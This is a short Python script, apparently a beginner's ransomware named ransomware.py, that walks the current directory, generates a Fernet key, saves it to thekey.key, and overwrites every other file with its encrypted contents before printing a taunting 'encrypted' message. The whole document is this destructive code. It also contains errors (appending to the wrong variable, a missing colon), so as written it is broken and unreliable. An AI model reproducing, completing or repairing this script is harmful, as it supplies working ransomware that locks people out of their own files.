#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#  finding some files

files = []


#  only wanna encript files not any dictoraroes
for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	#  append only the file, check is it a file or dict then append
	if os.path.isfile(file):
		file.append(file)

print(files)

#  Creating a key
key = Fernet.generate_key()


#  Creating a file name key and writng the generated key value
with open("thekey.key", 'wb') as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile
		contents = thefile.read()
	contents_encrypated = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypated)

print("All of Your files have been encrypted!! adios")